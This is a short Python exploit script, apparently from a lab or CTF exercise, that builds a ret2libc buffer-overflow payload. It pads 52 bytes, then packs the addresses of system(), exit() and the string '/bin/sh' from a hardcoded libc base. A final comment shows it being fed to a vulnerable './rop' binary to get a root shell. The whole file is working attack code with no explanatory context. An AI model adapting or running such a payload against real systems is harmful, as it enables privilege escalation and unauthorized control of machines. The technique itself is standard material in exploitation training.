#!/usr/bin/python
#Author memN0ps

import struct

libc_base_addr = 0xb7e19000

system_off = 0x0003ada0 #system address
exit_off = 0x0002e9d0 #exit address
arg_off = 0x0015ba0b # /bin/sh

system_addr = struct.pack("<I", libc_base_addr+system_off)
exit_addr = struct.pack("<I", libc_base_addr+exit_off)
arg_addr = struct.pack("<I", libc_base_addr+arg_off)

length = len(system_addr)
length += len(exit_addr)
length += len(arg_addr)

buf = "A"*52
buf += system_addr
buf += exit_addr
buf += arg_addr
buf += "C" * (200 - 52 - length)

print(buf)

#./rop `python got-root.py`
